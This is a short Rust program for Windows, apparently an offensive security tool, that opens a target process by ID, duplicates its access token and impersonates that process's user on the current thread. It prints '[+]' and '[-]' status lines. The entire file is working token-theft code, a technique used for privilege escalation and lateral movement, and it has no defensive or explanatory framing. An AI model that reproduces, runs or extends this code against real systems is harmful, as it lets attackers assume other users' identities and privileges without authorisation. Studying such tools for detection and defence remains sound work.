use std::{
    env,
    ptr::null_mut
};
use winapi::{
    um::{
        processthreadsapi::{
            OpenProcess, 
            OpenProcessToken
        }, 
        winnt::{
            MAXIMUM_ALLOWED, 
            TOKEN_QUERY, 
            TOKEN_DUPLICATE, 
            TOKEN_IMPERSONATE, 
            SecurityImpersonation, 
            TokenPrimary,
            PROCESS_QUERY_LIMITED_INFORMATION
        },
        handleapi::{INVALID_HANDLE_VALUE, CloseHandle}, 
        securitybaseapi::{
            DuplicateTokenEx, 
            ImpersonateLoggedOnUser
        }, 
        errhandlingapi::GetLastError
    }, 
    shared::{
        minwindef::{
            FALSE, 
            DWORD
        }, 
    }, 
    ctypes::c_void
};

fn main() {
    let mut token: *mut c_void = null_mut();
    let mut duplicated_token: *mut c_void = null_mut();
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        println!("Usage: {} <pid>", args[0]);
        return;
    }

    unsafe {
        let proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, args[1].parse::<DWORD>().unwrap());

        if proc_handle == INVALID_HANDLE_VALUE || proc_handle == 0 as *mut c_void{
            let last_error = GetLastError();
            println!("[-] Failed to open process: {}", last_error);
            return;
        }
        println!("[+] Opened process");

        if OpenProcessToken(proc_handle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &mut token) == 0 {
            let last_error = GetLastError();
            println!("[-] Failed to open process token: {}", last_error);
            CloseHandle(proc_handle);
            return;
        }

        if DuplicateTokenEx(token, MAXIMUM_ALLOWED, null_mut(), SecurityImpersonation, TokenPrimary, &mut duplicated_token) == FALSE {
            let last_error = GetLastError();
            println!("[-] Failed to duplicate token: {}", last_error);
            CloseHandle(token);
            CloseHandle(proc_handle);
            return;
        }
        println!("[+] Duplicated token");

        if ImpersonateLoggedOnUser(duplicated_token) == FALSE {
            let last_error = GetLastError();
            println!("[-] Failed to impersonate user: {}", last_error);
            CloseHandle(duplicated_token);
            CloseHandle(token);
            CloseHandle(proc_handle);
            return;
        }      

        println!("[+] This thread running as the impersonated user!");
        CloseHandle(duplicated_token);
        CloseHandle(token);
        CloseHandle(proc_handle);
    };
}
